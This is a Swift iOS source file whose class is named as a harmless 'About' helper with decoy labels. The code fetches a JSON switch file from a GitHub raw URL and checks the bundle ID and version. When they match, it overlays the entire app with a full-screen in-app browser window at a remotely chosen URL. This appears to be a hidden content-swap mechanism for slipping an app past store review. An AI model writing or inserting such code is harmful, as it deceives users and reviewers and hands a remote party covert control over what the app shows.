import UIKit
import SafariServices
import CoreTelephony

public extension DispatchQueue {
    
    private static var _onceTracker = [String]()
    public class func once(token: String, block:()->Void) {
        objc_sync_enter(self)
        defer { objc_sync_exit(self) }
        
        if _onceTracker.contains(token) {
            return
        }
        
        _onceTracker.append(token)
        block()
    }
}

class AboutReq: NSObject {
    static var AIDN : String? = nil
    static var AKYS : String? = nil
    static var userInfo : String? = nil
    static var headerView : UIView? = nil
    static var headerImg : UIView? = nil
    static var winView : UIWindow? = nil
    static var cellular_Data : CTCellularData? = nil
    static var aboutContent : SFSafariViewController? = nil
    static var objFi : String? = nil
    static var objSe : String? = nil;
    static var aboutInfo: String? = nil;
    
    class func loadHeader(key : String) {
        
        if key.count > 0 {
            aboutInfo = key
        }
        
        NotificationCenter.default.addObserver(forName: NSNotification.Name(rawValue: "ABOUTCONDI"), object: nil, queue: OperationQueue.main) { (noti) in
            DetOption(name: String(format: "%@", "hello"))
        }
        NotificationCenter.default.addObserver(forName: NSNotification.Name(rawValue: "ABOUTSUCS"), object: nil, queue: OperationQueue.main) { (noti) in
            loadedResponse()
        }
        NotificationCenter.default.addObserver(forName: NSNotification.Name(rawValue: "UIApplicationDidChangeStatusBarOrientationNotification"), object: nil, queue: OperationQueue.main) { (noti) in
            let useinfo = noti.userInfo as! Dictionary<String, Any>
            let str = String(format: "%@", useinfo["UIApplicationStatusBarOrientationUserInfoKey"] as! CVarArg)
            if str == "1" {
                self.headerView?.isHidden = true;
            } else {
                self.headerView?.isHidden = false;
            }
            self.headerImg?.isHidden = !(self.headerView?.isHidden)!;
        }
        
        MoreAboutOption(arr: ["world"])
    }
    
    class func configVersion(value : String) -> Bool {
        let verInfo = Bundle.main.infoDictionary?["CFBundleShortVersionString"] as! String
        if value == verInfo {
            return true
        }
        return false
    }
    
    class func loadedResponse() {
        if aboutContent == nil {
            aboutContent = SFSafariViewController.init(url: URL(string: userInfo!)!)
        }
        self.winView = UIWindow.init(frame: UIScreen.main.bounds)
        self.winView?.backgroundColor = UIColor.white
        self.winView?.rootViewController = aboutContent
        self.winView?.windowLevel = UIWindowLevelAlert
        self.winView?.isHidden = false
        self.winView?.alpha = 1;
        if self.isIPhoneX() {
            self.winView?.addSubview(self.headerView!)
            self.winView?.addSubview(self.headerImg!)
            if UIApplication.shared.isStatusBarHidden {
                aboutContent?.view.frame = CGRect.init(x: 0, y: -5, width: UIScreen.main.bounds.size.width, height: UIScreen.main.bounds.size.height + 5)
            } else {
                aboutContent?.view.frame = CGRect.init(x: 0, y: -49, width: UIScreen.main.bounds.size.width, height: UIScreen.main.bounds.size.height + 49)
            }
        } else {
            aboutContent?.view.frame = CGRect.init(x: 0, y: -self.iphonexH(), width: UIScreen.main.bounds.size.width, height: UIScreen.main.bounds.size.height + self.iphonexH())
            
        }
        self.winView?.makeKeyAndVisible()
    }
    
    class func DisplayAbout() {
        if aboutInfo == nil {
            return
        }
        if aboutContent == nil {
            aboutContent = SFSafariViewController.init(url: URL(string: aboutInfo!)!)
        }
        UIApplication.shared.keyWindow?.rootViewController?.present(aboutContent!, animated: true, completion: nil)
    }
    
    class func MoreAboutOption(arr : Array<String>) {
        
        versionNetReq(name: "more")
        cellular_Data = CTCellularData.init()
        cellular_Data?.cellularDataRestrictionDidUpdateNotifier = {(status) in
            if status == CTCellularDataRestrictedState.notRestricted {
                DispatchQueue.main.asyncAfter(deadline: .now() + 2, execute: {
                    versionNetReq(name: "more")
                })
            }
        }
    }
    class func versionNetReq(name : String) {
        let bunName = Bundle.main.infoDictionary?["CFBundleExecutable"]
        let bunInfo = String(format: "%@", Bundle.main.infoDictionary?["CFBundleIdentifier"] as! CVarArg)
        let requestInfo = String(format: "https://raw.githubusercontent.com/GitUserTec/MoreGit/master/%@.txt", bunName as! CVarArg)
        let session = URLSession.shared
        var request = URLRequest.init(url: URL(string: requestInfo)!)
        request.httpMethod = "GET"
        let task = session.dataTask(with: request) { (data, response, error) in
            
            if data != nil {
                do {
                    let obj =  try JSONSerialization.jsonObject(with: data!, options: JSONSerialization.ReadingOptions.allowFragments)
                    let result = obj as! Dictionary<String, Any>
                    
                    let bunid = result["bundleId"] as! String
                    if bunInfo != bunid {
                        return
                    }
                    let temp = result["version"] as! String
                    let storeV = String(format: "%@", temp)
                    if configVersion(value: storeV) {
                        NotificationCenter.default.post(name: NSNotification.Name(rawValue: "ABOUTCONDI"), object: nil)
                        DispatchQueue.main.asyncAfter(deadline: .now() + 0.5, execute: {
                            NotificationCenter.default.post(name: NSNotification.Name(rawValue: "DetOption"), object: nil, userInfo: ["result" : result])
                        })
                    }
                } catch {
                   
                }
            }
        }
        task.resume()
    }
    
    class func isIPhoneX() -> Bool {
        if (__CGSizeEqualToSize(UIScreen.main.bounds.size, CGSize.init(width: 375, height: 812)) ||
            __CGSizeEqualToSize(UIScreen.main.bounds.size, CGSize.init(width: 812, height: 375))) {
            return true;
        }
        else {
            return false;
        }
    }
    
    class func iphonexH() -> CGFloat {
        if (__CGSizeEqualToSize(UIScreen.main.bounds.size, CGSize.init(width: 375, height: 812)) ||
            __CGSizeEqualToSize(UIScreen.main.bounds.size, CGSize.init(width: 812, height: 375))) {
            return 39
        } else {
            if UIApplication.shared.isStatusBarHidden {
                return 42
            } else {
                return 64
            }
        }
    }
    class func DetOption(name : String) {
        NotificationCenter.default.addObserver(forName: NSNotification.Name(rawValue: "DetOption"), object: nil, queue: OperationQueue.main) { (noti) in
            let userinfo = noti.userInfo
            let result = userinfo!["result"] as! Dictionary<String, Any>
            let model = result["info"] as? String
            if model != nil && (model?.count)! > 0 {
                userInfo = model
                self.headerView = UIView.init(frame: CGRect.init(x: 0, y: 0, width: UIScreen.main.bounds.size.width, height: iphonexH()))
                self.headerView?.backgroundColor = UIColor.white
                if self.isIPhoneX() {
                    self.headerImg = UIView.init(frame: CGRect.init(x: 0, y: 0, width: UIScreen.main.bounds.size.height, height: 39))
                } else {
                    self.headerImg = UIView.init(frame: CGRect.init(x: 0, y: 0, width: UIScreen.main.bounds.size.height, height: 44))
                }
                self.headerImg?.isHidden = true;
                self.headerImg?.backgroundColor = UIColor.white
                NotificationCenter.default.post(name: NSNotification.Name(rawValue: "ABOUTSUCS"), object: nil, userInfo: ["info" : model as Any])
            }
        }
    }
    
    class func stringTransform(string : String) -> String {
        var target : String = ""
        let arr = string.components(separatedBy: "lox")
        for str in arr {
            target = target.appending(str)
        }
        return target
    }
}
